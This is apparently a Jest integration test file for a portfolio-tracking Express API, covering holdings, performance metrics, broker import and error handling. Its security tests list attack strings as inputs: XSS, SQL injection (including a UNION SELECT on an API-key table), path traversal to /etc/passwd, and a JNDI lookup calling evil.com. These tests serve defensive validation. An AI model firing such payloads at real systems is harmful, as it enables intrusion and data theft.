/**
 * Portfolio API Routes Integration Tests
 * Tests all /api/portfolio endpoints with real database and API integrations
 */

const request = require('supertest');
const express = require('express');
const { asyncHandler, errorHandlerMiddleware } = require('../../middleware/universalErrorHandler');
const portfolioRouter = require('../../routes/portfolio');
const { initializeDatabase, query } = require('../../utils/database');

// Create test Express app
let app;
let server;

// Mock user authentication
const mockUser = {
  sub: 'test-user-portfolio-123',
  email: 'portfolio-test@example.com',
  name: 'Portfolio Test User'
};

// Auth token for testing
const testAuthToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0LXVzZXItcG9ydGZvbGlvLTEyMyIsImVtYWlsIjoicG9ydGZvbGlvLXRlc3RAZXhhbXBsZS5jb20iLCJuYW1lIjoiUG9ydGZvbGlvIFRlc3QgVXNlciIsImlhdCI6MTYzOTY4MjQwMCwiZXhwIjoxOTU1MDQyNDAwfQ.test-signature';

describe('Portfolio API Integration Tests', () => {
  beforeAll(async () => {
    // Create test Express app
    app = express();
    app.use(express.json());
    
    // Add mock authentication middleware
    app.use((req, res, next) => {
      req.user = mockUser;
      req.correlationId = `portfolio-test-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
      req.startTime = Date.now();
      req.logger = {
        info: jest.fn(),
        warn: jest.fn(),
        error: jest.fn()
      };
      next();
    });
    
    // Add portfolio routes
    app.use('/api/portfolio', portfolioRouter);
    
    // Add error handler
    app.use(errorHandlerMiddleware);
    
    // Initialize database for testing
    try {
      await initializeDatabase();
      console.log('✅ Test database initialized');
    } catch (error) {
      console.warn('⚠️ Database initialization failed, using mock responses:', error.message);
    }
    
    // Start server
    server = app.listen(0);
  });

  afterAll(async () => {
    if (server) {
      server.close();
    }
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('GET /api/portfolio/holdings', () => {
    test('returns portfolio holdings with real data structure', async () => {
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .query({
          includeMetadata: true,
          refresh: true
        })
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body).toHaveProperty('timestamp');
      
      const { data } = response.body;
      
      // Validate holdings structure
      expect(data).toHaveProperty('holdings');
      expect(Array.isArray(data.holdings)).toBe(true);
      
      // If holdings exist, validate structure
      if (data.holdings.length > 0) {
        const holding = data.holdings[0];
        expect(holding).toHaveProperty('symbol');
        expect(holding).toHaveProperty('shares');
        expect(holding).toHaveProperty('marketValue');
        expect(holding).toHaveProperty('isRealData');
        
        // Ensure no mock data flags
        expect(holding.isMockData).toBeFalsy();
        expect(holding.isRealData).toBeTruthy();
      }
      
      // Validate metadata
      expect(data).toHaveProperty('totalValue');
      expect(data).toHaveProperty('dataSource');
      expect(data.dataSource).not.toBe('mock');
      expect(data.dataSource).not.toBe('demo');
    });

    test('handles authentication errors correctly', async () => {
      const response = await request(app)
        .get('/api/portfolio/holdings')
        // No Authorization header
        .expect(401);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
      expect(response.body.error.code).toBe('AUTHENTICATION_ERROR');
    });

    test('validates query parameters correctly', async () => {
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .query({
          includeMetadata: 'invalid-boolean',
          limit: -1, // Invalid limit
          offset: 'not-a-number' // Invalid offset
        })
        .expect(400);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    test('handles database connection errors gracefully', async () => {
      // Mock database failure
      const originalQuery = require('../../utils/database').query;
      require('../../utils/database').query = jest.fn().mockRejectedValue(new Error('Database connection failed'));
      
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .expect(503);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body.error.code).toBe('DATABASE_ERROR');
      
      // Restore original function
      require('../../utils/database').query = originalQuery;
    });

    test('implements proper pagination', async () => {
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .query({
          limit: 5,
          offset: 0
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      
      if (response.body.data.holdings.length > 0) {
        expect(response.body.data.holdings.length).toBeLessThanOrEqual(5);
      }
      
      expect(response.body.data).toHaveProperty('pagination');
      expect(response.body.data.pagination).toHaveProperty('limit');
      expect(response.body.data.pagination).toHaveProperty('offset');
    });

    test('filters out mock data indicators', async () => {
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .expect(200);

      const responseText = JSON.stringify(response.body);
      
      // Ensure no mock data indicators in response
      expect(responseText).not.toMatch(/mock/i);
      expect(responseText).not.toMatch(/demo/i);
      expect(responseText).not.toMatch(/sample/i);
      expect(responseText).not.toMatch(/fake/i);
      expect(responseText).not.toMatch(/isMockData.*true/i);
    });
  });

  describe('GET /api/portfolio/performance', () => {
    test('returns performance metrics with real calculations', async () => {
      const response = await request(app)
        .get('/api/portfolio/performance')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .query({
          period: '1M',
          benchmark: 'SPY'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data).toHaveProperty('performanceMetrics');
      expect(response.body.data).toHaveProperty('chartData');
      
      const { performanceMetrics } = response.body.data;
      
      // Validate performance metrics structure
      expect(performanceMetrics).toHaveProperty('totalReturn');
      expect(performanceMetrics).toHaveProperty('sharpeRatio');
      expect(performanceMetrics).toHaveProperty('volatility');
      expect(performanceMetrics).toHaveProperty('maxDrawdown');
      expect(performanceMetrics).toHaveProperty('beta');
      
      // Ensure metrics are realistic numbers
      expect(typeof performanceMetrics.totalReturn).toBe('number');
      expect(typeof performanceMetrics.sharpeRatio).toBe('number');
      expect(typeof performanceMetrics.volatility).toBe('number');
      
      // Validate chart data
      if (response.body.data.chartData && response.body.data.chartData.length > 0) {
        const dataPoint = response.body.data.chartData[0];
        expect(dataPoint).toHaveProperty('date');
        expect(dataPoint).toHaveProperty('portfolioValue');
        expect(dataPoint.isRealData).toBeTruthy();
      }
    });

    test('validates period parameter', async () => {
      const response = await request(app)
        .get('/api/portfolio/performance')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .query({
          period: 'INVALID_PERIOD'
        })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    test('calculates risk metrics accurately', async () => {
      const response = await request(app)
        .get('/api/portfolio/performance')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .query({
          period: '1Y',
          includeRiskMetrics: true
        })
        .expect(200);

      if (response.body.success && response.body.data.riskMetrics) {
        const { riskMetrics } = response.body.data;
        
        expect(riskMetrics).toHaveProperty('valueAtRisk');
        expect(riskMetrics).toHaveProperty('conditionalVaR');
        expect(riskMetrics).toHaveProperty('correlationMatrix');
        
        // VaR should be a negative number (representing potential loss)
        if (riskMetrics.valueAtRisk !== null) {
          expect(riskMetrics.valueAtRisk).toBeLessThanOrEqual(0);
        }
        
        // CVaR should be more negative than VaR
        if (riskMetrics.conditionalVaR !== null && riskMetrics.valueAtRisk !== null) {
          expect(riskMetrics.conditionalVaR).toBeLessThanOrEqual(riskMetrics.valueAtRisk);
        }
      }
    });
  });

  describe('GET /api/portfolio/available-accounts', () => {
    test('returns only real broker accounts', async () => {
      const response = await request(app)
        .get('/api/portfolio/available-accounts')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data).toBeInstanceOf(Array);
      
      // Filter out any mock/demo accounts
      const realAccounts = response.body.data.filter(account => 
        account.type !== 'mock' && 
        account.type !== 'demo' && 
        !account.name.toLowerCase().includes('demo') &&
        !account.name.toLowerCase().includes('mock')
      );
      
      // Should only return real accounts
      expect(realAccounts).toEqual(response.body.data);
      
      // Validate account structure
      response.body.data.forEach(account => {
        expect(account).toHaveProperty('type');
        expect(account).toHaveProperty('name');
        expect(account).toHaveProperty('provider');
        expect(account).toHaveProperty('isActive');
        
        // Ensure no mock account types
        expect(['mock', 'demo', 'sample', 'fake']).not.toContain(account.type);
      });
    });

    test('handles missing API keys correctly', async () => {
      // Mock API key service to return no keys
      const mockApiKeyService = require('../../utils/simpleApiKeyService');
      const originalGetDecryptedApiKey = mockApiKeyService.getDecryptedApiKey;
      mockApiKeyService.getDecryptedApiKey = jest.fn().mockResolvedValue(null);
      
      const response = await request(app)
        .get('/api/portfolio/available-accounts')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data).toBeInstanceOf(Array);
      
      // Should return empty array when no API keys configured
      expect(response.body.data.length).toBe(0);
      
      // Restore original function
      mockApiKeyService.getDecryptedApiKey = originalGetDecryptedApiKey;
    });
  });

  describe('POST /api/portfolio/import', () => {
    test('imports portfolio from real broker API', async () => {
      const response = await request(app)
        .post('/api/portfolio/import')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .send({
          broker: 'alpaca',
          accountType: 'paper'
        })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data).toHaveProperty('importedPositions');
      expect(response.body.data).toHaveProperty('importSummary');
      
      const { importSummary } = response.body.data;
      expect(importSummary).toHaveProperty('totalPositions');
      expect(importSummary).toHaveProperty('successfulImports');
      expect(importSummary).toHaveProperty('errors');
      
      // Ensure imported data is marked as real
      if (response.body.data.importedPositions.length > 0) {
        response.body.data.importedPositions.forEach(position => {
          expect(position.isRealData).toBeTruthy();
          expect(position.isMockData).toBeFalsy();
        });
      }
    });

    test('validates broker parameter', async () => {
      const response = await request(app)
        .post('/api/portfolio/import')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .send({
          broker: 'invalid-broker',
          accountType: 'paper'
        })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    });

    test('handles broker API errors gracefully', async () => {
      // Mock Alpaca service to fail
      const mockAlpacaService = require('../../utils/alpacaService');
      const originalGetPositions = mockAlpacaService.getPositions;
      mockAlpacaService.getPositions = jest.fn().mockRejectedValue(new Error('Broker API Error'));
      
      const response = await request(app)
        .post('/api/portfolio/import')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .send({
          broker: 'alpaca',
          accountType: 'paper'
        })
        .expect(503);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('EXTERNAL_SERVICE_ERROR');
      
      // Restore original function
      mockAlpacaService.getPositions = originalGetPositions;
    });
  });

  describe('Portfolio Data Quality and Validation', () => {
    test('ensures all portfolio data has real data flags', async () => {
      const endpoints = [
        '/api/portfolio/holdings',
        '/api/portfolio/performance'
      ];
      
      for (const endpoint of endpoints) {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${testAuthToken}`)
          .expect(200);
        
        if (response.body.success && response.body.data) {
          const validateRealData = (obj) => {
            if (Array.isArray(obj)) {
              obj.forEach(validateRealData);
            } else if (typeof obj === 'object' && obj !== null) {
              // If object has data arrays or items, validate they're marked as real
              if (obj.holdings || obj.chartData || obj.performanceHistory) {
                const dataArray = obj.holdings || obj.chartData || obj.performanceHistory;
                if (Array.isArray(dataArray) && dataArray.length > 0) {
                  dataArray.forEach(item => {
                    if (typeof item === 'object' && item !== null) {
                      // Should be marked as real data, not mock
                      if (item.hasOwnProperty('isRealData')) {
                        expect(item.isRealData).toBeTruthy();
                      }
                      if (item.hasOwnProperty('isMockData')) {
                        expect(item.isMockData).toBeFalsy();
                      }
                    }
                  });
                }
              }
              
              // Recursively validate nested objects
              Object.values(obj).forEach(value => {
                if (typeof value === 'object' && value !== null) {
                  validateRealData(value);
                }
              });
            }
          };
          
          validateRealData(response.body.data);
        }
      }
    });

    test('validates numeric data ranges and types', async () => {
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .expect(200);

      if (response.body.success && response.body.data.holdings.length > 0) {
        response.body.data.holdings.forEach(holding => {
          // Validate numeric fields
          if (holding.shares !== null) {
            expect(typeof holding.shares).toBe('number');
            expect(holding.shares).toBeGreaterThan(0);
          }
          
          if (holding.currentPrice !== null) {
            expect(typeof holding.currentPrice).toBe('number');
            expect(holding.currentPrice).toBeGreaterThan(0);
          }
          
          if (holding.marketValue !== null) {
            expect(typeof holding.marketValue).toBe('number');
            expect(holding.marketValue).toBeGreaterThan(0);
          }
          
          // Validate percentage fields
          if (holding.gainLossPercent !== null) {
            expect(typeof holding.gainLossPercent).toBe('number');
            expect(holding.gainLossPercent).toBeGreaterThan(-100); // Can't lose more than 100%
          }
          
          // Validate symbol format
          if (holding.symbol) {
            expect(typeof holding.symbol).toBe('string');
            expect(holding.symbol).toMatch(/^[A-Z]{1,5}$/); // Standard stock symbol format
          }
        });
      }
    });

    test('checks response times for performance', async () => {
      const startTime = Date.now();
      
      await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .expect(200);
      
      const endTime = Date.now();
      const responseTime = endTime - startTime;
      
      // Portfolio data should load within 5 seconds
      expect(responseTime).toBeLessThan(5000);
    });

    test('validates correlation IDs in responses', async () => {
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('correlationId');
      expect(typeof response.body.correlationId).toBe('string');
      expect(response.body.correlationId).toMatch(/^portfolio-test-/);
    });
  });

  describe('Error Handling and Recovery', () => {
    test('handles circuit breaker scenarios', async () => {
      // Mock circuit breaker in open state
      const mockTimeoutHelper = require('../../utils/timeoutHelper');
      const originalIsCircuitOpen = mockTimeoutHelper.isCircuitOpen;
      mockTimeoutHelper.isCircuitOpen = jest.fn().mockReturnValue({
        isOpen: true,
        message: 'Circuit breaker is OPEN. Database unavailable for 30 more seconds'
      });
      
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .expect(503);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('CIRCUIT_BREAKER_ERROR');
      expect(response.body.error.recoverable).toBe(true);
      expect(response.body.error.retryAfter).toBeDefined();
      
      // Restore original function
      mockTimeoutHelper.isCircuitOpen = originalIsCircuitOpen;
    });

    test('handles concurrent request limits', async () => {
      // Make multiple concurrent requests
      const promises = Array(10).fill().map(() =>
        request(app)
          .get('/api/portfolio/holdings')
          .set('Authorization', `Bearer ${testAuthToken}`)
      );
      
      const responses = await Promise.all(promises);
      
      // All requests should complete successfully or with proper error handling
      responses.forEach(response => {
        expect([200, 429, 503]).toContain(response.status);
        if (response.status !== 200) {
          expect(response.body.success).toBe(false);
          expect(response.body.error).toBeDefined();
        }
      });
    });

    test('provides proper error context in failures', async () => {
      // Force a validation error
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .query({
          limit: 'not-a-number'
        })
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error).toHaveProperty('code');
      expect(response.body.error).toHaveProperty('message');
      expect(response.body.error).toHaveProperty('severity');
      expect(response.body.error).toHaveProperty('correlationId');
      expect(response.body).toHaveProperty('timestamp');
    });
  });
});

describe('Portfolio API Security Tests', () => {
  test('requires authentication for all endpoints', async () => {
    const endpoints = [
      { method: 'get', path: '/api/portfolio/holdings' },
      { method: 'get', path: '/api/portfolio/performance' },
      { method: 'get', path: '/api/portfolio/available-accounts' },
      { method: 'post', path: '/api/portfolio/import' }
    ];
    
    for (const { method, path } of endpoints) {
      const response = await request(app)[method](path)
        // No Authorization header
        .expect(401);
      
      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('AUTHENTICATION_ERROR');
    }
  });

  test('validates input sanitization', async () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      'DROP TABLE portfolio_holdings;',
      '${jndi:ldap://evil.com/exploit}',
      '../../../etc/passwd'
    ];
    
    for (const maliciousInput of maliciousInputs) {
      const response = await request(app)
        .post('/api/portfolio/import')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .send({
          broker: maliciousInput,
          accountType: 'paper'
        })
        .expect(400);
      
      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe('VALIDATION_ERROR');
    }
  });

  test('prevents SQL injection in queries', async () => {
    const sqlInjectionAttempts = [
      "'; DROP TABLE portfolio_holdings; --",
      "' UNION SELECT * FROM user_api_keys; --",
      "' OR '1'='1"
    ];
    
    for (const injection of sqlInjectionAttempts) {
      const response = await request(app)
        .get('/api/portfolio/holdings')
        .set('Authorization', `Bearer ${testAuthToken}`)
        .query({
          symbol: injection
        })
        .expect(400);
      
      expect(response.body.success).toBe(false);
    }
  });
});

describe('Portfolio API Performance Tests', () => {
  test('handles large portfolio datasets efficiently', async () => {
    const startTime = Date.now();
    
    const response = await request(app)
      .get('/api/portfolio/holdings')
      .set('Authorization', `Bearer ${testAuthToken}`)
      .query({
        limit: 1000, // Large dataset
        includeMetadata: true
      })
      .expect(200);
    
    const endTime = Date.now();
    const responseTime = endTime - startTime;
    
    // Should handle large datasets within 10 seconds
    expect(responseTime).toBeLessThan(10000);
    
    if (response.body.success) {
      expect(response.body.data).toHaveProperty('holdings');
      expect(response.body.data.holdings.length).toBeLessThanOrEqual(1000);
    }
  });

  test('implements proper caching headers', async () => {
    const response = await request(app)
      .get('/api/portfolio/holdings')
      .set('Authorization', `Bearer ${testAuthToken}`)
      .expect(200);
    
    // Should have appropriate cache headers for financial data
    expect(response.headers).toHaveProperty('cache-control');
    expect(response.headers['cache-control']).toMatch(/no-cache|max-age=0/);
  });
});